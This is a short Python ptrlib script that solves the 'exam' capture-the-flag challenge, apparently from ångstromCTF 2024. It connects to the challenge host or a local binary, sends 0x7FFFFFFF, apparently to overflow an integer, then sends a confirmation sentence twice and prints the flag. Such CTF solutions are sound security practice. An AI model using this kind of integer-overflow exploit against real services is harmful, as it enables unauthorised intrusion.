#!/usr/bin/env python
import ptrlib as ptr
import sys

elf = ptr.ELF("./exam")
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return ptr.Socket("challs.actf.co", 31322)
    else:
        return ptr.Process(elf.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def main():
    io = connect()

    io.sendline(str(0x7FFFFFFF))
    io.sendline(
        b"I confirm that I am taking this exam between the dates 5/24/2024 and 5/27/2024. I will not disclose any information about any section of this exam."
    )
    io.sendline(
        b"I confirm that I am taking this exam between the dates 5/24/2024 and 5/27/2024. I will not disclose any information about any section of this exam."
    )
    flag = io.recvlineafter(b"You will have ").decode()
    print(flag)

    io.close()


if __name__ == "__main__":
    main()
